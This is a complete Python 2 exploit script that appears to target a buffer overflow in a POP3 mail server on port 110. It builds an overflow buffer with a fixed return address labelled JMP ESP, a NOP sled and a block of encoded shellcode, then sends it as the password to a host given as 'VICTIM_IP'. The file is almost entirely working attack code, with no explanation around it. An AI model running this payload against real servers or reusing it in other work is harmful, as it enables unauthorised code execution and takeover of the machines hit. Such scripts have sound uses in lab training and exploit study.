#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#5F4A358F FFE4 JMP ESP

shellcode = ("\xb8\x22\x2c\x25\x89\xdd\xc6\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x31\x47\x12\x83\xc7\x04\x03\x65\x22\xc7\x7c\x95\xd2\x85"
"\x7f\x65\x23\xea\xf6\x80\x12\x2a\x6c\xc1\x05\x9a\xe6\x87\xa9"
"\x51\xaa\x33\x39\x17\x63\x34\x8a\x92\x55\x7b\x0b\x8e\xa6\x1a"
"\x8f\xcd\xfa\xfc\xae\x1d\x0f\xfd\xf7\x40\xe2\xaf\xa0\x0f\x51"
"\x5f\xc4\x5a\x6a\xd4\x96\x4b\xea\x09\x6e\x6d\xdb\x9c\xe4\x34"
"\xfb\x1f\x28\x4d\xb2\x07\x2d\x68\x0c\xbc\x85\x06\x8f\x14\xd4"
"\xe7\x3c\x59\xd8\x15\x3c\x9e\xdf\xc5\x4b\xd6\x23\x7b\x4c\x2d"
"\x59\xa7\xd9\xb5\xf9\x2c\x79\x11\xfb\xe1\x1c\xd2\xf7\x4e\x6a"
"\xbc\x1b\x50\xbf\xb7\x20\xd9\x3e\x17\xa1\x99\x64\xb3\xe9\x7a"
"\x04\xe2\x57\x2c\x39\xf4\x37\x91\x9f\x7f\xd5\xc6\xad\x22\xb2"
"\x2b\x9c\xdc\x42\x24\x97\xaf\x70\xeb\x03\x27\x39\x64\x8a\xb0"
"\x3e\x5f\x6a\x2e\xc1\x60\x8b\x67\x06\x34\xdb\x1f\xaf\x35\xb0"
"\xdf\x50\xe0\x17\x8f\xfe\x5b\xd8\x7f\xbf\x0b\xb0\x95\x30\x73"
"\xa0\x96\x9a\x1c\x4b\x6d\x4d\x29\x87\x6d\xa0\x45\x95\x6d\xbe"
"\x47\x10\x8b\xd4\x77\x75\x04\x41\xe1\xdc\xde\xf0\xee\xca\x9b"
"\x33\x64\xf9\x5c\xfd\x8d\x74\x4e\x6a\x7e\xc3\x2c\x3d\x81\xf9"
"\x58\xa1\x10\x66\x98\xac\x08\x31\xcf\xf9\xff\x48\x85\x17\x59"
"\xe3\xbb\xe5\x3f\xcc\x7f\x32\xfc\xd3\x7e\xb7\xb8\xf7\x90\x01"
"\x40\xbc\xc4\xdd\x17\x6a\xb2\x9b\xc1\xdc\x6c\x72\xbd\xb6\xf8"
"\x03\x8d\x08\x7e\x0c\xd8\xfe\x9e\xbd\xb5\x46\xa1\x72\x52\x4f"
"\xda\x6e\xc2\xb0\x31\x2b\xf2\xfa\x1b\x1a\x9b\xa2\xce\x1e\xc6"
"\x54\x25\x5c\xff\xd6\xcf\x1d\x04\xc6\xba\x18\x40\x40\x57\x51"
"\xd9\x25\x57\xc6\xda\x6f")

buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3500-2606-4-351-16) 

try:
    print "\nSending evil buffer..."
    s.connect(('VICTIM_IP', 110))
    data = s.recv(1024)
    s.send('User username' + '\r\n')
    data=s.recv(1024)
    s.send('PASS '+buffer+ '\r\n')
    print "\Done!."
except:
    print "Could not connect to POP3!"
